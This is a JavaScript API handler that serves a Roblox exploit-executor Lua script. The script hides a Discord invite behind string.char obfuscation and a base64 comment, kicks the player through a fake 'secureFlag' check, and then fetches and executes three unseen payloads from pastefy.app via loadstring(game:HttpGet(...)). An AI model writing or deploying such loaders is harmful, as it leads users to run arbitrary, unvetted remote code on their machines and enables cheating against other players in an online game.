export default function handler(req, res) {
  res.setHeader("Content-Type", "text/plain");

  const lua = `
-- ðŸ”¹ All Belong 2 @mizu-dump
local HttpService = game:GetService("HttpService")

local Dc = table.concat({
    string.char(104,116,116,112,115), -- https (added 115)
    "://",
    string.char(100,105,115,99,111,114,100,46,103,103,47),
    "mxSvSpJe7s"
})

-- ðŸ”¹ Base32 Encode
local function secureFlag()
    -- ENC:LS0gQ2hhbmdlIGMgdG8gOTk5OSBpZiB5b3Ugd2FudCBpdCB0byByZXR1cm4gZmFsc2UgYW5kIHRyaWdnZXIga2ljaw== (only Me Can Read This HAHA L FlashHub for skidding my script!!)
    local a, b, c = 1234, 4321, 5555
    return ((a + b) - c) == 0
end

local Enabled = secureFlag()

-- ðŸ”¹ Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- ðŸ”¹ Join MizuHub Now!
if not Enabled then
    setclipboard(Dc)
    LocalPlayer:Kick("Script Got Skid By @FlashHub.\nDiscord : " .. Dc)
    return
end

loadstring(game:HttpGet("https://pastefy.app/swVoPwKZ/raw"))()

loadstring(game:HttpGet("https://pastefy.app/cLGvFayb/raw"))()

loadstring(game:HttpGet("https://pastefy.app/ZfpoaVWN/raw"))()

`;

  res.status(200).send(lua);
}
